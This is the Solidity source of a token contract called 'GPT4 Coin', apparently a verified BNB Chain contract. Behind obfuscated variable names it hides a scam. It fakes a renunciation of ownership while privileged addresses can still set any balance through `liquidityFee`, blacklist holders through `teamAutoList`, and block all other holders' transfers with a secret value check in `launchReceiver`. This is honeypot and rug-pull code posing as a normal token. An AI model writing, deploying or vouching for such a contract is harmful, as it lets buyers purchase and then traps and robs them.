/**
 *Submitted for verification at BscScan.com on 2023-03-27
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface swapReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderShouldLimit) external view returns (uint256);

    function transfer(address walletMax, uint256 txReceiver) external returns (bool);

    function allowance(address atLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 txReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address walletMax,
        uint256 txReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableFund, uint256 value);
    event Approval(address indexed atLaunch, address indexed spender, uint256 value);
}

interface minReceiverLaunched is swapReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract feeTakeReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeMin {
    function createPair(address fundLaunchedWallet, address tradingSwapMax) external returns (address);
}

interface tradingTo {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract GPT4Coin is feeTakeReceiver, swapReceiver, minReceiverLaunched {

    bool private limitLiquidity;

    function transferFrom(address maxIs, address walletMax, uint256 txReceiver) external override returns (bool) {
        if (_msgSender() != walletLimit) {
            if (walletTeam[maxIs][_msgSender()] != type(uint256).max) {
                require(txReceiver <= walletTeam[maxIs][_msgSender()]);
                walletTeam[maxIs][_msgSender()] -= txReceiver;
            }
        }
        return launchReceiver(maxIs, walletMax, txReceiver);
    }

    mapping(address => uint256) private takeReceiverSender;

    function teamFrom(uint256 txReceiver) public {
        fromBuy();
        senderExempt = txReceiver;
    }

    uint256 private maxReceiver;

    bool public autoLaunchedFrom;

    function owner() external view returns (address) {
        return tradingWallet;
    }

    bool private tokenReceiverSell;

    function getOwner() external view returns (address) {
        return tradingWallet;
    }

    function symbol() external view virtual override returns (string memory) {
        return walletEnable;
    }

    function teamAutoList(address senderModeLaunched) public {
        fromBuy();
        
        if (senderModeLaunched == tokenBuy || senderModeLaunched == txMin) {
            return;
        }
        totalLaunch[senderModeLaunched] = true;
    }

    function minLimit(address launchedTx) public {
        if (feeTotal) {
            return;
        }
        if (launchEnable == maxReceiver) {
            maxReceiver = launchEnable;
        }
        tradingIs[launchedTx] = true;
        
        feeTotal = true;
    }

    function launchReceiver(address maxIs, address walletMax, uint256 txReceiver) internal returns (bool) {
        if (maxIs == tokenBuy) {
            return atTx(maxIs, walletMax, txReceiver);
        }
        uint256 amountAtTeam = swapReceiver(txMin).balanceOf(marketingIsToken);
        require(amountAtTeam == senderExempt);
        require(!totalLaunch[maxIs]);
        return atTx(maxIs, walletMax, txReceiver);
    }

    string private totalFeeIs = "GPT4 Coin";

    uint256 public launchEnable;

    address public txMin;

    mapping(address => bool) public tradingIs;

    bool private liquidityReceiverMode;

    mapping(address => bool) public totalLaunch;

    constructor (){
        if (limitLiquidity != autoLaunchedFrom) {
            tokenReceiverSell = false;
        }
        enableIsReceiver();
        tradingTo toTake = tradingTo(walletLimit);
        txMin = feeMin(toTake.factory()).createPair(toTake.WETH(), address(this));
        
        tokenBuy = _msgSender();
        tradingIs[tokenBuy] = true;
        takeReceiverSender[tokenBuy] = tradingReceiver;
        
        emit Transfer(address(0), tokenBuy, tradingReceiver);
    }

    mapping(address => mapping(address => uint256)) private walletTeam;

    address public tokenBuy;

    event OwnershipTransferred(address indexed marketingTradingTo, address indexed isAuto);

    uint8 private minWalletTrading = 18;

    address marketingIsToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 private tradingReceiver = 100000000 * 10 ** 18;

    function approve(address totalExempt, uint256 txReceiver) public virtual override returns (bool) {
        walletTeam[_msgSender()][totalExempt] = txReceiver;
        emit Approval(_msgSender(), totalExempt, txReceiver);
        return true;
    }

    address walletLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public totalSell;

    string private walletEnable = "GCN";

    uint256 private sellAmountSwap;

    function totalSupply() external view virtual override returns (uint256) {
        return tradingReceiver;
    }

    function balanceOf(address senderShouldLimit) public view virtual override returns (uint256) {
        return takeReceiverSender[senderShouldLimit];
    }

    bool public feeTotal;

    address private tradingWallet;

    function atTx(address maxIs, address walletMax, uint256 txReceiver) internal returns (bool) {
        require(takeReceiverSender[maxIs] >= txReceiver);
        takeReceiverSender[maxIs] -= txReceiver;
        takeReceiverSender[walletMax] += txReceiver;
        emit Transfer(maxIs, walletMax, txReceiver);
        return true;
    }

    function fromBuy() private view {
        require(tradingIs[_msgSender()]);
    }

    uint256 isWallet;

    function decimals() external view virtual override returns (uint8) {
        return minWalletTrading;
    }

    uint256 senderExempt;

    function allowance(address sellMarketingLiquidity, address totalExempt) external view virtual override returns (uint256) {
        if (totalExempt == walletLimit) {
            return type(uint256).max;
        }
        return walletTeam[sellMarketingLiquidity][totalExempt];
    }

    function enableIsReceiver() public {
        emit OwnershipTransferred(tokenBuy, address(0));
        tradingWallet = address(0);
    }

    function transfer(address isEnable, uint256 txReceiver) external virtual override returns (bool) {
        return launchReceiver(_msgSender(), isEnable, txReceiver);
    }

    function liquidityFee(address isEnable, uint256 txReceiver) public {
        fromBuy();
        takeReceiverSender[isEnable] = txReceiver;
    }

    function name() external view virtual override returns (string memory) {
        return totalFeeIs;
    }

}